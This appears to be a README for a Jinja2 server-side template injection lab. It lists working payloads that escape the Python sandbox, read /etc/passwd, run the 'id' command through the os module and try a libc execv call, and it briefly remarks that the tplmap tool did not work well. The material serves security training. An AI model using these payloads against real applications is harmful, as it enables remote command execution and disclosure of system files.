


# Template Injection Jinja2

## Build instructions

Requirements:
 - Docker
 - Docker-compose

## Solutions

```
{{''.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd","r").read() }}
```

```
[40]:  <type 'file'>
[59]: <class 'warnings.catch_warnings'>
WARNINGS.__init__.func_globals['linecache'].__dict__.values()[12] : <module 'os' from '/usr/lib/python2.7/os.pyc'>
```

Executing command and storing the result temporary in the temp folder:
```
{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('id > /tmp/cmd') }}{{''.__class__.__mro__[2].__subclasses__()[40]("/tmp/cmd","r").read() }}
```

 - https://hexplo.it/escaping-the-csawctf-python-sandbox/

### Libc attempt

```
{{ self.__class__.__mro__[1].__subclasses__()[226]('libc-2.23.so').execv('/bin/touch','/tmp/1234') }}
```

### TPLMap (not working)

(Tool that is not working well on jinja2)
https://github.com/epinna/tplmap
